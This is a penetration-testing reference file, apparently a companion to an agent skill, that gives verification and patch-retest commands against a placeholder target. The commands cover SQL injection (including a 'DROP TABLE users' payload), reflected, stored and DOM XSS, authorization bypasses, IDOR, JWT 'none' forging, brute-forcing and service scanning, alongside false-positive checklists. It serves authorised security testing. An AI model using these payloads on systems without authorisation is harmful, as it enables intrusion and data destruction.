# Verification Loop — Payloads & Commands

> Companion to `SKILL.md`. Contains verification payloads, confirmation commands, and false positive elimination checklists organized by finding type.

---

## Quick Start Checklist

```
1. Pre-condition check → 2. Execute & observe → 3. Post-condition → 4. Independent confirm → 5. FP eliminate → 6. Document
```

---

## SQL Injection Verification Payloads

### Error-Based SQLi Confirmation

```bash
# Original payload
curl -s "http://target/page?id=1' OR 1=1--"

# Independent confirmation — different payload
curl -s "http://target/page?id=1' UNION SELECT NULL,NULL,NULL--"
curl -s "http://target/page?id=1' AND 1=CONVERT(int,(SELECT @@version))--"
curl -s "http://target/page?id=1'; SELECT pg_sleep(5)--"

# SQLmap verification (different tool)
sqlmap -u "http://target/page?id=1" --batch --level=3 --risk=2 --dbs
```

### Blind SQLi Confirmation

```bash
# Time-based verification
curl -s -o /dev/null -w "%{time_total}" "http://target/page?id=1' AND SLEEP(5)--"
# Expected: response time > 5 seconds

# Boolean-based verification
curl -s "http://target/page?id=1' AND 1=1--" | wc -c
curl -s "http://target/page?id=1' AND 1=2--" | wc -c
# Expected: different response lengths
```

---

## XSS Verification Payloads

### Reflected XSS Confirmation

```bash
# Original payload
curl -s "http://target/search?q=<script>alert(1)</script>"

# Independent confirmation — different vectors
curl -s "http://target/search?q=<img src=x onerror=alert(1)>"
curl -s "http://target/search?q=<svg onload=alert(1)>"
curl -s "http://target/search?q=\"><script>alert(1)</script>"
curl -s "http://target/search?q=javascript:alert(1)"

# Browser-based confirmation (use with browser DevTools)
# Navigate to: http://target/search?q=<script>alert(document.domain)</script>
```

### Stored XSS Confirmation

```bash
# Submit payload via API
curl -s -X POST http://target/api/comments \
  -H "Content-Type: application/json" \
  -d '{"comment": "<script>alert(1)</script>"}'

# Verify persistence — retrieve from different session
curl -s -b "session=different_user" http://target/api/comments
# Expected: payload present in response body
```

### DOM XSS Confirmation

```bash
# Test document.location sink
curl -s "http://target/page#<img src=x onerror=alert(1)>"

# Test document.write sink
curl -s "http://target/page?callback=alert(1)"

# Test innerHTML sink
curl -s "http://target/page?name=<img src=x onerror=alert(1)>"
```

---

## Authentication Bypass Verification

### Session-Based Bypass

```bash
# Original: access admin with user session
curl -s -b "session=user_session_token" http://target/admin/dashboard

# Independent confirmation — different method
curl -s -H "Authorization: Bearer user_token" http://target/admin/api/users
curl -s -H "Cookie: role=admin" http://target/admin/dashboard
curl -s -H "X-Forwarded-For: 127.0.0.1" http://target/admin/dashboard
```

### IDOR Verification

```bash
# Original: access other user's resource
curl -s -b "session=user_A" http://target/api/users/2/profile

# Independent confirmation — different user, same target
curl -s -b "session=user_B" http://target/api/users/2/profile
curl -s -b "session=user_A" http://target/api/users/2/profile -X PUT -d '{"email":"test@test.com"}'

# Mass assignment test
curl -s -b "session=user_A" -X PUT http://target/api/users/me \
  -H "Content-Type: application/json" \
  -d '{"role":"admin"}'
```

### JWT Manipulation

```bash
# Decode JWT
echo "TOKEN_HEADER" | base64 -d 2>/dev/null
echo "TOKEN_PAYLOAD" | base64 -d 2>/dev/null

# None algorithm attack
# Modify header: {"alg":"none","typ":"JWT"}
# Modify payload: {"role":"admin"}
# Reassemble: base64header.base64payload.

# Weak secret brute force
jwt-cracker "jwt_token_here" -d /usr/share/wordlists/rockyou.txt
```

---

## Network Vulnerability Verification

### Service Version Verification

```bash
# Original: nmap service detection
nmap -sV -p 443 target

# Independent confirmation — different tool
nc -v target 443
curl -sI https://target
openssl s_client -connect target:443 -servername target </dev/null

# Version-specific exploit check
searchsploit <service_name> <version>
```

### TLS/SSL Verification

```bash
# Comprehensive TLS check
nmap --script ssl-enum-ciphers -p 443 target
sslyze --regular target

# Certificate verification
openssl s_client -connect target:443 -servername target </dev/null | openssl x509 -noout -dates -issuer

# Heartbleed check
nmap --script ssl-heartbleed -p 443 target
```

---

## False Positive Elimination Checklist

### Environment-Specific Check

```markdown
## FP Elimination: Environment
- [ ] Does this work from a different IP address?
- [ ] Does this work from a different network position?
- [ ] Does this work against a different instance of the same application?
- [ ] Is the vulnerability present in both development and staging?
- [ ] Does this require a specific OS or browser?
```

### Timing-Dependent Check

```markdown
## FP Elimination: Timing
- [ ] Can this be reproduced consistently (3/3 attempts)?
- [ ] Does it work without race conditions?
- [ ] Is the delay measurable and consistent?
- [ ] Does it work at different times of day?
```

### Privilege-Dependent Check

```markdown
## FP Elimination: Privilege
- [ ] Does this work as an unauthenticated user?
- [ ] Does this work as a low-privilege authenticated user?
- [ ] Does this work without any special headers or cookies?
- [ ] Is the access level actually elevated or just appearing so?
```

### Configuration-Dependent Check

```markdown
## FP Elimination: Configuration
- [ ] Does this work with default application settings?
- [ ] Does this work with different WAF configurations?
- [ ] Is this dependent on debug mode being enabled?
- [ ] Is this dependent on a specific feature flag?
```

### Tool Artifact Check

```markdown
## FP Elimination: Tool Artifact
- [ ] Can this be reproduced with a different tool?
- [ ] Can this be reproduced with manual curl/browser testing?
- [ ] Is the tool injecting headers or parameters that trigger the behavior?
- [ ] Does the raw response (without tool parsing) confirm the finding?
```

---

## Remediation Verification Payloads

### SQL Injection — Patch Verification

```bash
# Re-test original payload (should fail)
curl -s "http://target/page?id=1' OR 1=1--"
# Expected: error or sanitized response, NOT data dump

# Re-test variant payloads (should also fail)
curl -s "http://target/page?id=1' UNION SELECT NULL--"
curl -s "http://target/page?id=1; DROP TABLE users--"
sqlmap -u "http://target/page?id=1" --batch --level=5
# Expected: all injection attempts fail

# Verify parameterized queries
curl -s "http://target/page?id=1" -v 2>&1 | grep -i "parameterized"
```

### XSS — Patch Verification

```bash
# Re-test original payload
curl -s "http://target/search?q=<script>alert(1)</script>"
# Expected: HTML-encoded output, script tag not rendered

# Test bypass attempts
curl -s "http://target/search?q=<ScRiPt>alert(1)</ScRiPt>"
curl -s "http://target/search?q=<script\x00>alert(1)</script>"
curl -s "http://target/search?q={{7*7}}"  # Template injection check
# Expected: all bypasses fail
```

### Access Control — Patch Verification

```bash
# Re-test original bypass
curl -s -b "session=low_priv_user" http://target/admin/dashboard
# Expected: 403 Forbidden or redirect to login

# Test variant access methods
curl -s -b "session=low_priv_user" http://target/admin/api/users
curl -s -b "session=low_priv_user" -H "X-Original-URL: /admin" http://target/
curl -s -b "session=low_priv_user" -X POST http://target/admin/api/users
# Expected: all access denied
```

---

## Evidence Capture Templates

### Verification Evidence Template

```markdown
## Verification Evidence: [FINDING-ID]

### Original Finding
- **Type**: [SQLi/XSS/Auth Bypass/Network/Other]
- **Location**: [URL/endpoint/port]
- **Original tool**: [Tool that found it]
- **Original payload**: [Exact payload used]

### Independent Confirmation
- **Confirmation tool**: [Different tool used]
- **Confirmation payload**: [Different payload used]
- **Confirmation result**: [Output/evidence]

### False Positive Analysis
- Environment-specific: [Y/N] — Evidence:
- Timing-dependent: [Y/N] — Evidence:
- Privilege-dependent: [Y/N] — Evidence:
- Configuration-dependent: [Y/N] — Evidence:
- Tool artifact: [Y/N] — Evidence:

### Final Verdict
- **Status**: [CONFIRMED / NOT CONFIRMED / PARTIALLY CONFIRMED]
- **Confidence**: [High / Medium / Low]
- **Severity**: [Critical / High / Medium / Low / Info]
```
